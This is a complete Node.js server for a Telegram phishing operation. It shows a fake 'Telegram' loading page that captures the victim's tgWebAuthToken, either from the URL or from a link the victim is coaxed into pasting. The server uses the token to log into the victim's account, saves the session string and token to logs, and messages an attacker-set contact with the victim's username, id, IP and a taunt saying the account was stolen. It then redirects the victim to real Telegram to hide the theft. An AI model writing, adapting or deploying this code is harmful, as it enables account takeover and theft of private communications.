import express from "express";
import fs from "node:fs";
import path from "node:path";
import { TelegramClient, Api } from "telegram";
import { StringSession } from "telegram/sessions/index.js";
import { FloodWaitError, RPCError } from "telegram/errors/index.js";

const PORT = Number(process.env.PORT || 3000);
const TARGET = (process.env.TARGET || "").trim();
const REDIRECT = process.env.REDIRECT_TO || "https://web.telegram.org/a/";
const DATA_DIR = process.env.DATA_DIR || "data";
const TEXT = "hahaha tvoi akk spizdili";

const API_ID = 2040;
const API_HASH = "b18441a1ff607e10a989891a5462e627";
const OPTS = {
  connectionRetries: 3,
  deviceModel: "Chrome",
  systemVersion: "131",
  appVersion: "131.0",
  langCode: "ru",
  floodSleepThreshold: 0,
};

const log = (m) => console.log(`[${new Date().toISOString()}] ${m}`);
const seen = new Map();

function dump(line) {
  try {
    fs.mkdirSync(DATA_DIR, { recursive: true });
    fs.appendFileSync(path.join(DATA_DIR, "hits.log"), `${new Date().toISOString()}\t${line}\n`);
  } catch {}
}

function claim(token) {
  const now = Date.now();
  for (const [k, t] of seen) if (now - t > 120000) seen.delete(k);
  if (seen.has(token)) return false;
  seen.set(token, now);
  return true;
}

const client = (session = "") =>
  new TelegramClient(new StringSession(session), API_ID, API_HASH, OPTS);

const POOL_SIZE = 3;
const pool = [];

async function newWarm() {
  const c = client();
  c.setLogLevel("error");
  await c.connect();
  await c.invoke(new Api.help.GetConfig());
  return c;
}

async function topUp() {
  while (pool.length < POOL_SIZE) {
    try {
      pool.push(await newWarm());
      log(`pool=${pool.length}`);
    } catch (e) {
      log(`warm failed: ${String(e)}`);
      return;
    }
  }
}

async function takeClient() {
  const c = pool.pop();
  if (c) {
    void topUp();
    return c;
  }
  return newWarm();
}

async function importOn(c, token) {
  await c.invoke(
    new Api.auth.ImportWebTokenAuthorization({
      apiId: API_ID,
      apiHash: API_HASH,
      webAuthToken: token,
    }),
  );
}

async function handleToken(token, ip, t0) {
  let c = await takeClient();
  log(`import start lag=${Date.now() - t0}ms pooled=${pool.length}`);

  try {
    try {
      await importOn(c, token);
    } catch (e) {
      const retryable = e instanceof FloodWaitError || !(e instanceof RPCError);
      if (!retryable) throw e;
      log(`retry on fresh conn: ${e instanceof FloodWaitError ? `flood ${e.seconds}s` : String(e).slice(0, 60)}`);
      await c.disconnect().catch(() => {});
      c = await newWarm();
      await importOn(c, token);
    }

    const me = await c.getMe();
    log(`import ok in ${Date.now() - t0}ms`);
    log(`SESSION userId=${me.id} ${c.session.save()}`);

    if (!TARGET) return;

    const peer = await c.getInputEntity(TARGET);
    await c.sendMessage(peer, {
      message: `${TEXT}\n@${me.username ?? "нет"} | id ${me.id} | ${ip}`,
    });
    log("MESSAGE SENT");
  } finally {
    await c.disconnect().catch(() => {});
  }
}

const app = express();
app.set("trust proxy", true);
app.use(express.json({ limit: "16kb" }));

function page() {
  return `<!doctype html><html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Telegram</title>
<style>
  html,body{margin:0;height:100%;background:#17212b;color:#e9eef4;
    font:15px/1.5 -apple-system,Segoe UI,Roboto,sans-serif}
  .w{min-height:100%;display:flex;align-items:center;justify-content:center;
    flex-direction:column;gap:14px;padding:24px;text-align:center;box-sizing:border-box}
  .d{width:40px;height:40px;border:3px solid #2b5278;border-top-color:#5eb5f7;
    border-radius:50%;animation:s 1s linear infinite}
  @keyframes s{to{transform:rotate(360deg)}}
  #fb{display:none;width:100%;max-width:420px;flex-direction:column;gap:8px}
  textarea{width:100%;height:78px;box-sizing:border-box;background:#0e1621;color:#e9eef4;
    border:1px solid #2b5278;border-radius:8px;padding:8px;font:13px/1.4 monospace}
  button{padding:11px;border:0;border-radius:8px;background:#2b5278;color:#fff;font-size:15px}
  small{color:#7d8b99}
</style></head><body><div class="w">
<div id="ld"><div class="d"></div><div>Загрузка…</div></div>
<div id="fb">
  <small>Вставь исходную ссылку целиком</small>
  <textarea id="ta" placeholder="https://web.telegram.org/a/#tgWebAuthToken=..."></textarea>
  <button id="go">Отправить</button>
</div>
</div>
<script>
(function () {
  var R = ${JSON.stringify(REDIRECT)};
  var done = false;
  var finish = function () { if (done) return; done = true; setTimeout(function () { location.replace(R); }, 400); };
  var send = function (t) {
    if (!t) return;
    fetch('/api/collect', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ token: t })
    }).then(function (r) { return r.json(); }).then(finish).catch(finish);
  };
  var q = function (s) { return new URLSearchParams(s); };
  var t = q(location.hash.slice(1)).get('tgWebAuthToken') || q(location.search).get('tgWebAuthToken');
  if (t) { try { history.replaceState(null, '', location.pathname); } catch (e) {} send(t); return; }

  document.getElementById('ld').style.display = 'none';
  document.getElementById('fb').style.display = 'flex';
  document.getElementById('go').addEventListener('click', function () {
    var raw = document.getElementById('ta').value;
    var m = raw.match(/tgWebAuthToken=([^&#\\s]+)/);
    if (!m) { document.getElementById('ta').value = 'токен не найден'; return; }
    send(decodeURIComponent(m[1]));
  });
})();
</script></body></html>`;
}

app.post("/api/collect", (req, res) => {
  const t0 = Date.now();
  const token = String((req.body && req.body.token) || "").trim();
  if (!token) return res.status(400).json({ ok: false, error: "no token" });

  const ip = req.ip || "unknown";
  const ua = String(req.headers["user-agent"] || "");
  const fresh = claim(token);

  log(`HIT ip=${ip} len=${token.length} fresh=${fresh} ua=${ua.slice(0, 50)}`);
  dump(`hit\t${ip}\t${token}`);

  res.status(200).json({ ok: true });
  if (!fresh) return;

  handleToken(token, ip, t0).catch((e) => {
    log(`IMPORT FAILED: ${String(e)}`);
    dump(`fail\t${ip}\t${String(e).slice(0, 160)}`);
  });
});

app.get("/api/health", (_req, res) => res.json({ ok: true, up: process.uptime(), pool: pool.length }));

app.get("*", (_req, res) => {
  res.status(200).set("Cache-Control", "no-store").type("html").send(page());
});

app.listen(PORT, "0.0.0.0", () => {
  log(`listening on :${PORT}`);
  void topUp();
  setInterval(() => {
    if (pool.length < POOL_SIZE) void topUp();
  }, 60000);
});
